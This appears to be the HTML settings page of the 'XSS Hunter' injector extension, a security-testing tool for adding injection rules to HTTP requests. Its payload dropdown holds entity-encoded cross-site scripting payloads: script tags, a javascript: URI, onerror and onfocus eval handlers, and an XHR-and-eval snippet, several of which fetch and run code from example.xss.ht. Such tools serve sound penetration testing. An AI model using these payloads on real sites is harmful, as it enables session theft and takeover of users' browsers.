<!DOCTYPE html>
<html>
    <head>
        <title>
            XSS Hunter Injector Settings
        </title>
        <link rel="stylesheet" href="css/site.min.css">
        <link rel="stylesheet" href="css/codemirror.css">
        <link rel="stylesheet" href="css/bootstrap.min.css">
        <link rel="stylesheet" href="css/main.css">
    </head>
    <body>
        <div class="main-content settings-main-panel">
            <div class="panel panel-default">
                <div class="panel-heading">
                    <h2 class="panel-title"><b>Current Injection Rules</b></h2>
                </div>
                <div class="panel-body">
                    <div class="rules_list list-group">
                        <i>No rules set!</i>
                    </div>
                </div>
            </div>

            <div class="panel panel-default">
                <div class="panel-heading">
                    <h2 class="panel-title"><b>New Injection Rule</b></h2>
                </div>
                <div class="panel-body">
                    <div class="new_rule_div">
                        <p class="option_label_text">Target String <i>(Regex)</i>:</p>
                        <input type="text" class="form-control" placeholder="example.*replacement" id="target_string" autofocus>
                        <br />

                        <p class="option_label_text">Replace Target String in:</p>
                        <div class="target_string_location_select_div">
                            <select name="selecter_multiple" class="selecter_5 target_string_location_select" multiple="multiple">
                                <option value="entire">Entire Request</option>
                                <option value="header">Header</option>
                                <option value="body">Body</option>
                                <option value="first_line">First Line</option>
                            </select>
                        </div>
                        <br />

                        <p class="option_label_text">Replace With Payload:</p>
                        <div class="payload_select_div">
                            <select name="selecter_basic" class="selecter_3 payload_select"  data-selecter-options='{"cover":"true"}'>
                                <option value="generic_script_tag_payload">&#34;&#62;&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#32;&#115;&#114;&#99;&#61;https://example.xss.ht&#62;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;</option>
                                <option value="javascript_uri_payload">&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#101;&#118;&#97;&#108;&#40;&#39;&#118;&#97;&#114;&#32;&#97;&#61;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#92;&#39;&#115;&#99;&#114;&#105;&#112;&#116;&#92;&#39;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#92;&#39;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;&#101;&#120;&#97;&#109;&#112;&#108;&#101;&#46;&#120;&#115;&#115;&#46;&#104;&#116;&#92;&#39;&#59;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#39;&#41;</option>
                                <option value="input_tag_payload">&#34;&#62;&#60;&#105;&#110;&#112;&#117;&#116;&#32;&#111;&#110;&#102;&#111;&#99;&#117;&#115;&#61;&#101;&#118;&#97;&#108;&#40;&#97;&#116;&#111;&#98;&#40;&#116;&#104;&#105;&#115;&#46;&#105;&#100;&#41;&#41;&#32;&#105;&#100;&#61;&#112;&#97;&#121;&#108;&#111;&#97;&#100;&#32;&#97;&#117;&#116;&#111;&#102;&#111;&#99;&#117;&#115;&#62;</option>
                                <option value="img_tag_payload">&#34;&#62;&#60;&#105;&#109;&#103;&#32;&#115;&#114;&#99;&#61;&#120;&#32;&#105;&#100;&#61;&#112;&#97;&#121;&#108;&#111;&#97;&#100;&#32;&#111;&#110;&#101;&#114;&#114;&#111;&#114;&#61;&#101;&#118;&#97;&#108;&#40;&#97;&#116;&#111;&#98;&#40;&#116;&#104;&#105;&#115;&#46;&#105;&#100;&#41;&#41;&#62;</option>
                                <option value="source_tag_payload">&#34;&#62;&#60;&#118;&#105;&#100;&#101;&#111;&#62;&#60;&#115;&#111;&#117;&#114;&#99;&#101;&#32;&#111;&#110;&#101;&#114;&#114;&#111;&#114;&#61;&#101;&#118;&#97;&#108;&#40;&#97;&#116;&#111;&#98;&#40;&#116;&#104;&#105;&#115;&#46;&#105;&#100;&#41;&#41;&#32;&#105;&#100;&#61;&#112;&#97;&#121;&#108;&#111;&#97;&#100;&#62;</option>
                                <option value="srcdoc_tag_payload">&#60;iframe srcdoc="payload"&#62;</option>
                                <option value="xhr_payload">&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#102;&#117;&#110;&#99;&#116;&#105;&#111;&#110;&#32;&#98;&#40;&#41;&#123;&#101;&#118;&#97;&#108;&#40;&#116;&#104;&#105;&#115;&#46;&#114;&#101;&#115;&#112;&#111;&#110;&#115;&#101;&#84;&#101;&#120;&#116;&#41;&#125;&#59;&#97;&#61;&#110;&#101;&#119;&#32;&#88;&#77;&#76;&#72;&#116;&#116;&#112;&#82;&#101;&#113;&#117;&#101;&#115;&#116;&#40;&#41;&#59;&#97;&#46;&#97;&#100;&#100;&#69;&#118;&#101;&#110;&#116;&#76;&#105;&#115;&#116;&#101;&#110;&#101;&#114;&#40;&#34;&#108;&#111;&#97;&#100;&#34;&#44;&#32;&#98;&#41;&#59;&#97;&#46;&#111;&#112;&#101;&#110;&#40;&#34;&#71;&#69;&#84;&#34;&#44;&#32;&#34;&#47;&#47;&#101;&#120;&#97;&#109;&#112;&#108;&#101;&#46;&#120;&#115;&#115;&#46;&#104;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#101;&#110;&#100;&#40;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;</option>
                                <option value="custom_javascript">Custom JavaScript Manipulation (Advanced)</option>
                            </select>
                        </div>
                        <br />
                        <textarea id="custom_javascript_editor"></textarea>
                        <br />
                        <input type="hidden" id="rule_id">
                        <button type="button" class="btn btn-primary btn-block add_rule_button">Add Rule</button>
                        <button type="button" class="btn btn-primary btn-block update_rule_button">Update Rule</button>
                        <button type="button" class="btn btn-danger btn-block delete_rule_button">Delete Rule</button>
                        <button type="button" class="btn btn-normal btn-block cancel_rule_button">Cancel</button>
                    </div>
                </div>
            </div>
        </div>
    </body>
    <script type="text/javascript" src="js/jquery-2.1.4.min.js"></script>
    <script type="text/javascript" src="js/site.min.js"></script>
    <script type="text/javascript" src="js/codemirror.js"></script>
    <script type="text/javascript" src="js/javascript_code_editor.js"></script>
    <script type="text/javascript" src="js/background.js"></script>
    <script type="text/javascript" src="js/bootstrap.min.js"></script>
</html>
